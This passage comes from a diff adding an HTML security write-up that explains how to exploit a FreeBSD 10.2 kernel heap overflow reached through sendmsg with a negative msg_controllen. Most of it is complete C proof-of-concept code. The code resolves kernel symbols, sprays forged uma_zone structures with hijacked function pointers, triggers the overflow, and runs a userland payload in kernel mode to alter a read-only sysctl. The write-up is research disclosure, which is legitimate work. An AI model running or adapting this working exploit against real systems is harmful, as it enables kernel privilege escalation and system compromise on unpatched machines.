+	char *mapping, *buffer, *overflow;
+	const size_t copySize = bufferSize + overflowSize;
+	const size_t mappingSize = (copySize + PAGE_SIZE - 1) &amp; ~(PAGE_SIZE - 1);
+	
+	mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+	munmap(mapping + mappingSize, PAGE_SIZE);
+	
+	buffer = mapping + mappingSize - copySize;
+	overflow = buffer + bufferSize;
+	
+	memset(overflow, 0, overflowSize);
+	
+	// sizeof(struct uma_zone) == 0x300, but since we can't be certain exactly where we overflow from, we will craft at 256 byte intervals
+	for(size_t i = previousAllocations * bufferSize + 0xe0; i < overflowSize - 256; i += 256) {
+		craftZone(overflow + i);
+	}
+	
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	
+	memset(&amp;msg, 0, sizeof(msg));
+	msg.msg_control = buffer;
+	msg.msg_controllen = -1;
+	
+	printf("  [+] Performing overflow\n");
+	sendmsg(sock, &amp;msg, 0);
+	
+	printf("  [+] Triggering payload\n");
+	close(sock);
+	
+	munmap(mapping, mappingSize);
+	
+	return 0;
+}</code></pre>
+				
+				<br>
+				
+				<h2>Returning from the payload</h2>
+				<p>
+					After returning from the payload, the system will very quickly panic with a jump to <code>0</code>.
+				</p>
+
+				<p>
+					This is because some of the function pointers in <code>struct uma_zone</code> are assumed to be valid, and so are not checked for being non-<code>NULL</code> before being called (such as <code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/vm/uma_core.c#L2938">uz_release</a></code>).
+				</p>
+
+				<p>
+					To stop this panic from occurring, we need to make sure that we overflow these function pointers with the address of some dummy function; we can leave all other members set to <code>0</code>:
+				</p>
+
+				<pre><code>void craftZone(void *zone) {
+	void **uz_slab = (void **)(zone + 200);
+	void **uz_dtor = (void **)(zone + 216);
+	void **uz_fini = (void **)(zone + 232);
+	void **uz_import = (void **)(zone + 240);
+	void **uz_release = (void **)(zone + 248);
+	*uz_slab = dummy;
+	*uz_fini = payload;
+	*uz_import = dummy;
+	*uz_release = dummy;
+}</code></pre>
+
+				<br>
+
+				<p>
+					I altered the code path <code>uma_zfree_arg</code> that follows slightly, and now target the <code>uz_fini</code> function pointer for my payload instead of <code>uz_dtor</code>.
+				</p>
+
+				<p>
+					After crafting valid userland addresses for these function pointers, <code>uma_zfree_arg</code> will return gracefully to <code>uipc_detach</code> before panicking when another process closes a socket and triggers the kernel jump to userland memory.
+				</p>
+				
+				<br>
+				
+				<h2>Restoration</h2>
+				<p>
+					To fix the corruption, we should ideally overwrite valid zones back as soon as we gain kernel code execution. However, since my interest is just in demonstrating the impact of the bug, and not in creating fully weaponised source code, I decided to just repeat the overflow again, with different data.
+				</p>
+				
+				<p>
+					As a quick demo, to prevent panics, I just decided to overwrite with pointers to an arbitrary kernel function, <code>ata_get_xport</code>. As a result of this, after performing the exploit, any further allocations on the affected zones will fail (the <code>fetch</code> command won't work for example). However, this technique is sufficient to demonstrate my chosen payload.
+				</p>
+				
+				<p>
+					This final PoC demonstrates using kernel code execution to modify a read only <code>sysctl</code> variable, and then reading it from a separate userland process.
+				</p>
+				
+				<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/linker.h&gt;
+
+void *(*ata_get_xport)(void);
+int (*kprintf)(const char *fmt, ...);
+char *ostype;
+
+void *resolve(char *name) {
+	struct kld_sym_lookup ksym;
+	
+	ksym.version = sizeof(ksym);
+	ksym.symname = name;
+	
+	if(kldsym(0, KLDSYM_LOOKUP, &amp;ksym) < 0) {
+		perror("kldsym");
+		exit(1);
+	}
+	
+	printf("  [+] Resolved %s to %#lx\n", ksym.symname, ksym.symvalue);
+	return (void *)ksym.symvalue;
+}
+
+void dummy(void) { 
+}
+
+void payload(void) {
+	kprintf("  [+] Entered kernel payload\n");
+	
+	strcpy(ostype, "CTurt  ");
+}
+
+#define INFO_SIZE 0
+#define INFO_LIMIT 1
+#define INFO_USED 2
+#define INFO_FREE 3
+#define INFO_REQ 4
+#define INFO_FAIL 5
+
+int getZoneInfo(char *zname, int i) {
+	#define BUF_SIZE 256
+	#define LINE_SIZE 56
+	
+	unsigned int info[6] = { 0 };
+	FILE *fp = NULL;
+	char buf[BUF_SIZE];
+	char iname[LINE_SIZE];
+	
+	fp = popen("/usr/bin/vmstat -z", "r");
+	
+	if(fp == NULL) {
+		perror("popen");
+		exit(1);
+	}
+	
+	memset(buf, 0, sizeof(buf));
+	memset(iname, 0, sizeof(iname));
+	
+	while(fgets(buf, sizeof(buf) - 1, fp) != NULL) {
+		sscanf(buf, "%s %u, %u, %u, %u, %u, %u\n", iname, &amp;info[INFO_SIZE], &amp;info[INFO_LIMIT],
+			&amp;info[INFO_USED], &amp;info[INFO_FREE], &amp;info[INFO_REQ], &amp;info[INFO_FAIL]);
+		
+		if(strncmp(iname, zname, strlen(zname)) == 0 &amp;&amp; iname[strlen(zname)] == ':') {
+			break;
+		}
+	}
+	
+	pclose(fp);
+	return info[i];
+}
+
+void craftCorruptedZone(void *zone) {
+	void **uz_slab = (void **)(zone + 200);
+	void **uz_dtor = (void **)(zone + 216);
+	void **uz_fini = (void **)(zone + 232);
+	void **uz_import = (void **)(zone + 240);
+	void **uz_release = (void **)(zone + 248);
+	*uz_slab = dummy;
+	*uz_fini = payload;
+	*uz_import = dummy;
+	*uz_release = dummy;
+}
+
+void craftZone(void *zone) {
+	void **uz_slab = (void **)(zone + 200);
+	void **uz_dtor = (void **)(zone + 216);
+	void **uz_fini = (void **)(zone + 232);
+	void **uz_import = (void **)(zone + 240);
+	void **uz_release = (void **)(zone + 248);
+	
+	// put valid kernel address
+	*uz_slab = ata_get_xport;
+	*uz_fini = ata_get_xport;
+	*uz_import = ata_get_xport;
+	*uz_release = ata_get_xport;
+}
+
+int main(void) {
+	int sock;
+	struct msghdr msg;
+	
+	ata_get_xport = resolve("ata_get_xport");
+	kprintf = resolve("printf");
+	ostype = resolve("ostype");
+	
+	const int previousAllocations = getZoneInfo("mbuf", INFO_USED);
+	
+	const size_t bufferSize = getZoneInfo("mbuf", INFO_SIZE);
+	const size_t overflowSize = previousAllocations * bufferSize + 0x4000;
+	
+	char *mapping, *buffer, *overflow;
+	const size_t copySize = bufferSize + overflowSize;
+	const size_t mappingSize = (copySize + PAGE_SIZE - 1) &amp; ~(PAGE_SIZE - 1);
+	
+	mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+	munmap(mapping + mappingSize, PAGE_SIZE);
+	
+	buffer = mapping + mappingSize - copySize;
+	overflow = buffer + bufferSize;
+	
+	memset(overflow, 0, overflowSize);
+	
+	// sizeof(struct uma_zone) == 0x300, but since we can't be certain exactly where we overflow from, we will craft at 256 byte intervals
+	for(size_t i = previousAllocations * bufferSize + 0xe0; i < overflowSize - 256; i += 256) {
+		craftCorruptedZone(overflow + i);
+	}
+	
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	
+	memset(&amp;msg, 0, sizeof(msg));
+	msg.msg_control = buffer;
+	msg.msg_controllen = -1;
+	
+	printf("  [+] Performing overflow\n");
+	sendmsg(sock, &amp;msg, 0);
+	
+	printf("  [+] Triggering payload\n");
+	close(sock);
+	
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	
+	for(size_t i = previousAllocations * bufferSize + 0xe0; i < overflowSize - 256; i += 256) {
+		craftZone(overflow + i);
+	}
+	
+	printf("  [+] Performing overflow\n");
+	sendmsg(sock, &amp;msg, 0);
+	
+	munmap(mapping, mappingSize);
+	
+	return 0;
+}</code></pre>
+				
+				<br>
+				
+				<div class="center">
+					<img src="images/FreeBSD/sockargs-2.png" />
+				</div>
+				
+				<br>
+				
+				<h2>Summary</h2>
+				<p>
+					This bug was a pretty standard kernel heap overflow from user controlled memory, and with a user controlled size.
+				</p>
+				
+				<p>
+					I had fun analysing some of the kernel code paths reachable with user controlled values, and was ultimately able to successfully exploit the bug to gain arbitrary kernel code execution on FreeBSD 10.2-RELEASE for amd64.
+				</p>
+				
+				<br>
+				
+				<h2>Thanks</h2>
+				<ul>
+					<li><a href="http://blog.qwertyoruiop.com/">qwertyoruiop</a></li>
+					<li><a href="http://argp.github.io/">argp</a> for <a href="http://phrack.org/issues/66/8.html">his paper about exploiting UMA</a></li>
+				</ul>
+			</div>
+		</div>
+	</body>
+</html>
